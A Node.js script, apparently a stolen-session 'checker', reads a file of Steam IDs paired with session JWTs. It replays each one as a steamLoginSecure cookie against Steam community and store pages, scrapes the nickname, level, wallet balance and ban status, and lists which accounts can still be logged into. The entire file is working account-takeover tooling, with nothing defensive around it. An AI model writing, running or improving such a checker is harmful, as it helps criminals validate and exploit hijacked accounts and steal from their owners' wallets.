import fs from 'fs';

const steamTxtPath = 'C:\\Users\\iliyk\\Desktop\\steam.txt';
const steamTxt = fs.readFileSync(steamTxtPath, 'utf8');
const allTokens = [...new Set(steamTxt.match(/7656119\d+----ey[A-Za-z0-9_\-.]+/g) || [])];

console.log(`========================================================================`);
console.log(`  🔍 ГЛУБОКАЯ ПРОВЕРКА ВАЛИДНОСТИ И АВТОРИЗАЦИИ STEAM ТОКЕНОВ (${allTokens.length} шт.)`);
console.log(`========================================================================\n`);

async function verifyToken(tokenStr, index) {
  const [steamId, jwt] = tokenStr.split('----');
  const cookie = `sessionid=0123456789abcdef01234567; steamLoginSecure=${steamId}%7C%7C${jwt}; steamCountry=RU%7Cabc; timezoneOffset=10800,0`;

  let isStoreAuthValid = false;
  let isCommunityAuthValid = false;
  let isCommunityBanned = false;
  let personaName = 'Unknown';
  let steamLevel = 0;
  let walletCurrency = 'USD';
  let walletBalance = '0.00';
  let errorReason = '';

  // 1. Test Steam Community Authenticated Endpoint
  try {
    const commRes = await fetch('https://steamcommunity.com/actions/GetNotificationCounts', {
      headers: {
        'Cookie': cookie,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36'
      }
    });

    if (commRes.ok) {
      const commJson = await commRes.json().catch(() => null);
      if (commJson && (commJson.notifications !== undefined || commJson.unread_count !== undefined)) {
        isCommunityAuthValid = true;
      }
    }
  } catch (e) {}

  // 2. Test Store Account Endpoint
  try {
    const storeRes = await fetch('https://store.steampowered.com/account/', {
      headers: {
        'Cookie': cookie,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36'
      },
      redirect: 'manual'
    });

    const storeStatus = storeRes.status;
    const location = storeRes.headers.get('location') || '';

    if (storeStatus === 200) {
      const storeHtml = await storeRes.text();
      if (storeHtml.includes('account_name') || storeHtml.includes('user_avatar') || storeHtml.includes('accountData') || storeHtml.includes('wallet_balance')) {
        isStoreAuthValid = true;
        const walletMatch = storeHtml.match(/<div class="accountData price">([^<]+)<\/div>/);
        if (walletMatch) walletBalance = walletMatch[1].trim();
      }
    } else if (storeStatus === 302 && (location.includes('login') || location.includes('openid'))) {
      isStoreAuthValid = false;
    }
  } catch (e) {}

  // 3. Check Public Profile and Community Ban Status
  try {
    const profileRes = await fetch(`https://steamcommunity.com/profiles/${steamId}/`, {
      headers: {
        'Cookie': cookie,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36'
      }
    });
    const profileHtml = await profileRes.text();

    const nameMatch = profileHtml.match(/<span class="actual_persona_name">([^<]+)<\/span>/);
    if (nameMatch) personaName = nameMatch[1];

    const levelMatch = profileHtml.match(/<span class="friendPlayerLevelNum">(\d+)<\/span>/);
    if (levelMatch) steamLevel = parseInt(levelMatch[1], 10);

    if (profileHtml.includes('Community Banned') || profileHtml.includes('блокировка сообщества') || profileHtml.includes('community_ban')) {
      isCommunityBanned = true;
    }

    // Check if profile edit button exists when viewing self
    if (profileHtml.includes('profile_edit_btn') || profileHtml.includes(`profiles/${steamId}/edit`)) {
      isCommunityAuthValid = true;
    }
  } catch (e) {}

  const isValid = isStoreAuthValid || isCommunityAuthValid;

  return {
    index: index + 1,
    steamId,
    personaName,
    steamLevel,
    isStoreAuthValid,
    isCommunityAuthValid,
    isCommunityBanned,
    isValid: isValid && !isCommunityBanned,
    statusText: (isValid && !isCommunityBanned) 
      ? '🟢 100% ВАЛИДЕН (ВХОД УСПЕШЕН)' 
      : (isCommunityBanned ? '🔴 БАН СООБЩЕСТВА' : '❌ СЕССИЯ НЕВАЛИДНА (СБРОШЕНА)'),
    token: tokenStr
  };
}

async function runFullAudit() {
  const results = [];

  for (let i = 0; i < allTokens.length; i++) {
    const r = await verifyToken(allTokens[i], i);
    results.push(r);
    
    console.log(`[#${r.index}/${allTokens.length}] SteamID: ${r.steamId} | Ник: "${r.personaName}" (Lv ${r.steamLevel})`);
    console.log(`    • Авторизация Steam: Store=${r.isStoreAuthValid ? '✅' : '❌'} | Community=${r.isCommunityAuthValid ? '✅' : '❌'}`);
    console.log(`    • Бан сообщества:   ${r.isCommunityBanned ? '⛔ ДА (БАН)' : '✅ НЕТ'}`);
    console.log(`    • ИТОГОВЫЙ СТАТУС:   ${r.statusText}\n`);

    // Small delay to avoid rate limits
    await new Promise(res => setTimeout(res, 350));
  }

  const validAccounts = results.filter(r => r.isValid);
  const invalidAccounts = results.filter(r => !r.isValid);

  console.log(`========================================================================`);
  console.log(`📊 ИТОГИ ПРОВЕРКИ АВТОРИЗАЦИИ ВСЕХ ТОКЕНОВ:`);
  console.log(`========================================================================`);
  console.log(`✅ 100% РАБОЧИЕ И АКТИВНЫЕ (МОЖНО ВОЙТИ): ${validAccounts.length} шт.`);
  console.log(`❌ НЕРАБОЧИЕ / ЗАБАНЕННЫЕ:                  ${invalidAccounts.length} шт.`);
  console.log(`========================================================================\n`);

  if (invalidAccounts.length > 0) {
    console.log(`📋 СПИСОК НЕВАЛИДНЫХ АККАУНТОВ:`);
    for (const inv of invalidAccounts) {
      console.log(`   • ${inv.steamId} (${inv.personaName}): ${inv.statusText}`);
    }
  }
}

runFullAudit();
